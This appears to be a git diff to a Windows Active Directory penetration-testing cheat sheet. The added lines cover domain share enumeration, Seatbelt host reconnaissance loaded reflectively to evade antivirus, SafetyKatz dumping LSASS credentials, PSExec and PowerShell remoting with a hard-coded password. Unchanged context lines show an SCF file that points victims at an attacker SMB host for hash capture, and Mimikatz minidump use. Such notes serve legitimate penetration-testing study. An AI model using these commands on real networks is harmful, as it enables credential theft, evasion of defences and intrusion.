@@ -30,6 +30,8 @@ Get-DomainUser
 Get-DomainGroup
 Get-DomainGroupMember -identity "Domain Admins" -Domain m0chanAD.local -DomainController 10.10.14.10
 netdiscover -r subnet/24
+Find-DomainShare
+Get-DomainFileServer
 ```
 
 
@@ -356,18 +358,13 @@ Create .scf file and drop inside SMB Share and fire up Responder ;)
 
 
 Filename = @m0chan.scf
+
 [Shell]
 Command=2
 IconFile=\\10.10.14.2\Share\test.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
-
-
-
-
-
-SMB Relay
 
 
 
@@ -841,6 +838,50 @@ reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
 
 
 
+Run Seatbelt
+
+```
+#https://github.com/GhostPack/Seatbelt
+
+This is stupidily good, it can literally Enum everything you require and is also a .NET Assembly so can be reflectively loaded to avoid AV :D Win Win
+
+BasicOSInfo           -   Basic OS info (i.e. architecture, OS version, etc.)
+RebootSchedule        -   Reboot schedule (last 15 days) based on event IDs 12 and 13
+TokenGroupPrivs       -   Current process/token privileges (e.g. SeDebugPrivilege/etc.)
+UACSystemPolicies     -   UAC system policies via the registry
+PowerShellSettings    -   PowerShell versions and security settings
+AuditSettings         -   Audit settings via the registry
+WEFSettings           -   Windows Event Forwarding (WEF) settings via the registry
+LSASettings           -   LSA settings (including auth packages)
+UserEnvVariables      -   Current user environment variables
+SystemEnvVariables    -   Current system environment variables
+UserFolders           -   Folders in C:\Users\
+NonstandardServices   -   Services with file info company names that don't contain 'Microsoft'
+InternetSettings      -   Internet settings including proxy configs
+LapsSettings          -   LAPS settings, if installed
+LocalGroupMembers     -   Members of local admins, RDP, and DCOM
+MappedDrives          -   Mapped drives
+RDPSessions           -   Current incoming RDP sessions
+WMIMappedDrives       -   Mapped drives via WMI
+NetworkShares         -   Network shares
+FirewallRules         -   Deny firewall rules, "full" dumps all
+AntiVirusWMI          -   Registered antivirus (via WMI)
+InterestingProcesses  -   "Interesting" processes- defensive products and admin tools
+RegistryAutoRuns      -   Registry autoruns
+RegistryAutoLogon     -   Registry autologon information
+DNSCache              -   DNS cache entries (via WMI)
+ARPTable              -   Lists the current ARP table and adapter information (equivalent to arp -a)
+AllTcpConnections     -   Lists current TCP connections and associated processes
+AllUdpConnections     -   Lists current UDP connections and associated processes
+NonstandardProcesses  -   Running processeswith file info company names that don't contain 'Microsoft'
+  *  If the user is in high integrity, the following additional actions are run:
+SysmonConfig          -   Sysmon configuration from the registry
+
+And more!!
+```
+
+
+
 Dump Creds
 
 ```
@@ -860,6 +901,20 @@ and send the .bin to Mimikatz locally.
 sekurlsa::minidump C:\users\m0chan\lssas.dmp
 
 Can also be used for dumping and pass the ticket attacks but will cover this elsewhere.
+```
+
+
+
+SafetyKatz
+
+```
+#https://github.com/GhostPack/SafetyKatz
+
+Full C# Implemenatation of Mimikatz that can be reflectively loaded :D 
+
+"SafetyKatz is a combination of slightly modified version of @gentilkiwi's Mimikatz project and @subtee's .NET PE Loader.
+
+First, the MiniDumpWriteDump Win32 API call is used to create a minidump of LSASS to C:\Windows\Temp\debug.bin. Then @subtee's PELoader is used to load a customized version of Mimikatz that runs sekurlsa::logonpasswords and sekurlsa::ekeys on the minidump file, removing the file after execution is complete."
 ```
 
 
@@ -945,8 +1000,6 @@ PS C:\users\epugh_adm\Downloads> Invoke-WMIExec -Target 10.10.120.1 -Username m0
 
 
 
-
-
 Powershell Invoke-Command (Requires Port 5985)
 
 ```
@@ -958,83 +1011,21 @@ Invoke-Command -ComputerName FS01 -Credential $cred -ScriptBlock {whoami}
 
 
 
-
-
-
-
-
-
-
-
-###### [](#header-6)Header 6
-
-| head1        | head two          | three |
-|:-------------|:------------------|:------|
-| ok           | good swedish fish | nice  |
-| out of stock | good and plenty   | nice  |
-| ok           | good `oreos`      | hmm   |
-| ok           | good `zoute` drop | yumm  |
-
-### There's a horizontal rule below this.
-
-* * *
-
-### Here is an unordered list:
-
-*   Item foo
-*   Item bar
-*   Item baz
-*   Item zip
-
-### And an ordered list:
-
-1.  Item one
-1.  Item two
-1.  Item three
-1.  Item four
-
-### And a nested list:
-
-- level 1 item
-  - level 2 item
-  - level 2 item
-    - level 3 item
-    - level 3 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-  - level 2 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-- level 1 item
-
-### Small image
-
-![](https://assets-cdn.github.com/images/icons/emoji/octocat.png)
-
-### Large image
-
-![](https://guides.github.com/activities/hello-world/branching.png)
-
-
-### Definition lists can be used with HTML syntax.
-
-<dl>
-<dt>Name</dt>
-<dd>Godzilla</dd>
-<dt>Born</dt>
-<dd>1952</dd>
-<dt>Birthplace</dt>
-<dd>Japan</dd>
-<dt>Color</dt>
-<dd>Green</dd>
-</dl>
+PSExec
 
 ```
-Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
+psexec.exe \\dc01.m0chanAD.local cmd.exe
 ```
 
+
+
+Powershell Remoting
+
 ```
-The final element.
+$secpasswd = ConvertTo-SecureString 'password' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('WS02\USER', $secpasswd)
+
+$Session = New-PSSession -ComputerName FileServer -Credential $cred
+Enter-PSSession $Session
 ```
+
